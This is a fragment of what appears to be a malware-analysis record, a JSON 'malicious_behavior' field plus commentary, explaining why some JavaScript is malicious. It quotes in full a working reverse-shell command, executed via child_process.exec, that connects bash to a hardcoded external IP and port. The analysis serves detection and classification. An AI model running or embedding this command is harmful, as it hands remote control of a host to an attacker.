      "malicious_behavior": "The code executes a shell command that opens an interactive bash shell and redirects its input and output over a TCP connection to a hardcoded external IP address and port (121.4.80.209:2333). This is a classic reverse shell pattern, which allows an attacker to gain remote control over the host system without user consent or notification. The command uses 'child_process.exec' to run 'bash -i >& /dev/tcp/121.4.80.209/2333 0>&1', which is a direct and minimalistic way to establish a reverse shell. This behavior is strongly associated with malware and remote access trojans (RATs), enabling unauthorized remote command execution and system compromise. There is no legitimate or benign use case for such code embedded in JavaScript, especially with a hardcoded external IP and port, and no error handling or user interaction. Therefore, this code is definitively malicious."

Specifically, it attempts to open an interactive bash shell and redirect input/output to a remote IP address (121.4.80.209) on port 2333. This behavior is commonly used to gain unauthorized remote access to the system running this script, which is a clear indication of malicious intent."
